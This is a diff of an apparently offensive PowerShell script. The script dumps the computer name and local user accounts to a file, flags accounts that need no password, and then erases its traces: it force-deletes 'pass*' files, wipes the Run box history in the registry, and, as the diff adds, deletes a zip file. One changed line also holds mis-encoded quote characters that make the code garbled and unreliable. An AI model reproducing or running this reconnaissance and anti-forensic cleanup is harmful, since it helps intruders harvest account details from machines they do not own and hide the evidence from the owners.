@@ -24,7 +24,7 @@ $Date = Get-Date -Format yyyy-MM-dd;
 $Time = Get-Date -Format hh-mm-ss;
 dir env:;
 $env:computername | Out-File $FileName -Force;
-Add-Content -Path ‚Äú$FileName‚Äù -Value "Computer Info";
+Add-Content -Path ì$FileNameî -Value ìComputer Info";
 Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
 Get-LocalUser | Out-File $FileName -Append;
 
@@ -41,6 +41,9 @@ $statOutput = $args1 | Out-String;
 cd\;
 # empty temp folder
 rm $D\pass* -r -Force -ErrorAction SilentlyContinue;
+
+# delete .zip file
+rm $D\E.zip -r -Force -ErrorAction SilentlyContinue;
 
 # delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;
